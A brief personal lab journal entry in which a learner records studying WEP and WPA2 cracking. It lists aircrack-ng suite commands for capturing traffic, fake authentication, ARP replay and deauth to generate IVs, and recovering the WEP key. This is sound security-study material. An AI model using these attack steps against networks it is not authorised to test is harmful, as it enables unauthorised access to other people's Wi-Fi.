04/06/2025 Today I finished the WPA2 lab and wrote a script to capture packets as I got fed up typing the commands. 
            Also covered WEP cracking don't have any devices that support WEP though so just the thoery.  
            Within the WEP I used aircrack-ng on the .cap file and it found one potential target but no key found. 
            You would normally IF there is a wep device connected a KEY FOUND and then the [ 11:22:33:44:55 ] which you would then remove the colons from the pwd and then you can connect to the wifi as this is the PWD without the colons. 
            If there is not enough traffic, you can use a deauth attack to force the Access Point (AP) to communicate with me. 
            So then we can associate with the AP 
            sudo airodump-ng --bssid {MAC} --channel {#} --write [filename] [interfaceID]
            Now I am capturing and now I associate by 
            sudo aireplay-ng --fakeauth [0] (This is only do it once) -a [target network MAC] -h [my usb adapter MAC] (ifconfig first 12 digits and replace dash with colons.) [interface ID of USB adapter] 
            This will force the AP to communicate with me. I am not connected at this point, I am just communicating with it.   
            Now we run an ARP attack 
            sudo aireplay-ng --arpreplay -b {target network MAC}  -h [my usb adapter MAC] [interface ID of USB adapter] 
            My wireless adapter waits for an ARP packet capture it and retransmit it. The the AP will be forced to generate a new packet with a new IV. This will force the AP to continue to generate new packets with new IV's.  
            Then I can aircrack it 
            aircrack-ng [filename .cap] 
            KEY FOUND [ PWD remove colons]
